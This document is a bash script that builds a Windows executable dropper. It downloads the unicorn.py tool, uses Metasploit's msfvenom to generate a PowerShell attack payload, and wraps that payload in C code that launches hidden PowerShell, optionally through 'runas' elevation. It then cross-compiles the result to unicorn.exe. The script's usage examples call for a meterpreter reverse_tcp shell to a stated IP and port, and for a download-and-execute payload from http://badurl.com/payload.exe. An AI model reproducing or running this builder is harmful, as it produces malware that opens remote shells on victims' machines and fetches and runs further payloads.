#!/bin/bash
clear
echo '-------------------------------------------------------------------------'
echo '   Unicorn.py is available @ https://github.com/trustedsec/unicorn       '
echo '              Created by @HackingDave from trustedsec                    '   
echo '      Lame Unicorn Powershell2C code generator made by Astr0             '
echo '                                                                         '
echo ' Make sure you have i686-w64-mingw32-gcc cross-compiler or similar       '
echo '-------------------------------------------------------------------------'

echo '[*] Getting the unirorn.py code...'
wget -q -N "https://raw.githubusercontent.com/trustedsec/unicorn/master/unicorn.py" 
if [ -f  ./unicorn.py ]; then
echo '[*] unicorn.py downloaded' 
echo '[*] cleaning up previous builds'
rm -f unicorn.exe
ls -la unicorn.py
else
   echo '[-] Something went wrong during download .. '
exit 0
fi

echo "[*] Patching  unicorn.py"


sed -i 's/msfvenom/.\/msfvenom/g' unicorn.py
echo ""
echo "" 
if [ -z "$*" ];then  
echo 'Usage: unicorn2c.sh payload reverse_ipaddr port platform' 
echo 'Usage: unicorn2c.sh payload exename exeurl platform' 
echo 'Example: unicorn2c.sh windows/meterpreter/reverse_tcp 192.168.1.5 443 nonuac'
echo 'Example: unicorn2c.sh windows/meterpreter/reverse_tcp 192.168.1.5 443 uac' 
echo 'Example: unixorn2c.sh windows/download_exec exe=test.exe url=http://badurl.com/payload.exe nonuac' 
echo 'Example: unixorn2c.sh windows/download_exec exe=test.exe url=http://badurl.com/payload.exe uac' 
echo 'Valid platforms are: nonuac uac' 
exit 0 
fi
case $4 in 
nonuac)
echo '[*] Checking if metasploit msfvenom is present..'
if [ -x ./msfvenom ]; then
echo '[*] Found msfvenom in current path.....good'
else
   echo '[-] No msfvenom in path...make sure you have this script in your metasploit-framework path'
exit 0
fi 
echo 'Generating nonUAC unicorn.c ...' 
python unicorn.py $1 $2 $3 > /dev/null 2>&1 
echo '#include <stdio.h>' > unicorn.c 
echo '#include <string.h>' >> unicorn.c
echo '#include <stdlib.h>' >> unicorn.c
echo '#include <ctype.h>' >> unicorn.c 
echo '#include <aclapi.h>' >> unicorn.c 
echo '#include <shlobj.h>' >> unicorn.c 
echo '#include <windows.h>' >> unicorn.c 
echo '#pragma comment(lib, "advapi32.lib")' >> unicorn.c  
echo '#pragma comment(lib, "shell32.lib")' >> unicorn.c 
echo 'int main(int argc, char *argv[])' >> unicorn.c
echo '{' >> unicorn.c 
echo 'FreeConsole();' >> unicorn.c  
echo -n 'ShellExecute( NULL,NULL, "powershell.exe","-w 1 -C ' >> unicorn.c
cat powershell_attack.txt | sed -r 's/^.{20}//' >> unicorn.c
echo -n ', NULL,NULL);' >> unicorn.c
echo '' >> unicorn.c 
echo 'exit(0);' >> unicorn.c
echo '}' >> unicorn.c 
echo '[*] Exported unicorn.c'
echo '[*] Compiling unicorn.c'
i686-w64-mingw32-gcc unicorn.c -o unicorn.exe  -lws2_32 -mwindows > /dev/null 2>&1
if [ -x ./unicorn.exe ]; then
echo '[*] unicorn.exe compiled'
ls -la unicorn.exe
else
   echo '[-] Something went wrong during compilation .. '
exit 0
fi

;;

uac)
echo '[*] Checking if metasploit msfvenom is present..'
if [ -x ./msfvenom ]; then
echo '[*] Found msfvenom in current path.....good'
else
   echo '[-] No msfvenom in path...make sure you have this script in your metasploit-framework path'
exit 0
fi
echo 'Generating UAC  unicorn.c ...'
python unicorn.py $1 $2 $3 > /dev/null 2>&1
echo '#include <stdio.h>' > unicorn.c
echo '#include <string.h>' >> unicorn.c
echo '#include <stdlib.h>' >> unicorn.c
echo '#include <ctype.h>' >> unicorn.c
echo '#include <windows.h>' >> unicorn.c
echo '#include <aclapi.h>' >> unicorn.c
echo '#include <shlobj.h>' >> unicorn.c
echo '#pragma comment(lib, "advapi32.lib")' >> unicorn.c
echo '#pragma comment(lib, "shell32.lib")' >> unicorn.c
echo 'int main(int argc, char *argv[])' >> unicorn.c
echo '{' >> unicorn.c
echo 'FreeConsole();' >> unicorn.c
echo -n ' ShellExecute( NULL, "runas", "powershell.exe","-w 1 -C ' >> unicorn.c
cat powershell_attack.txt | sed -r 's/^.{20}//' >> unicorn.c
echo -n ',NULL,NULL);' >> unicorn.c
echo '' >> unicorn.c
echo 'exit(0);' >> unicorn.c
echo '}' >> unicorn.c
echo '[*] Exported unicorn.c'
echo '[*] Compiling unicorn.c'
i686-w64-mingw32-gcc unicorn.c -o unicorn.exe  -lws2_32 -mwindows > /dev/null 2>&1
if [ -x ./unicorn.exe ]; then
echo '[*] unicorn.exe compiled'
ls -la unicorn.exe
else
   echo '[-] Something went wrong during compilation .. '
exit 0
fi
;;

"")
echo '[-] Wrong argument ! ' 
echo '' 
echo '[i] Usage: unicorn2c.sh payload reverse_ipaddr port platform'
echo '[i] Usage: unicorn2c.sh payload exename exeurl platform'
echo '[i] Example: unicorn2c.sh windows/meterpreter/reverse_tcp 192.168.1.5 443 nonuac'
echo '[i] Example: unicorn2c.sh windows/meterpreter/reverse_tcp 192.168.1.5 443 uac'
echo '[i] Example: unixorn2c.sh windows/download_exec exe=test.exe url=http://badurl.com/payload.exe nonuac'
echo '[i] Example: unixorn2c.sh windows/download_exec exe=test.exe url=http://badurl.com/payload.exe uac'
echo '[i] Valid platforms are: nonuac uac'
;;

*) 
echo '[-] Wrong argument ! ' 
echo ''
echo '[i] Usage: unicorn2c.sh payload reverse_ipaddr port platform'
echo '[i] Usage: unicorn2c.sh payload exename exeurl platform'
echo '[i] Example: unicorn2c.sh windows/meterpreter/reverse_tcp 192.168.1.5 443 nonuac'
echo '[i] Example: unicorn2c.sh windows/meterpreter/reverse_tcp 192.168.1.5 443 uac'
echo '[i] Example: unixorn2c.sh windows/download_exec exe=test.exe url=http://badurl.com/payload.exe nonuac'
echo '[i] Example: unixorn2c.sh windows/download_exec exe=test.exe url=http://badurl.com/payload.exe uac'
echo '[i] Valid platforms are: nonuac uac'

exit 0 
;;
esac
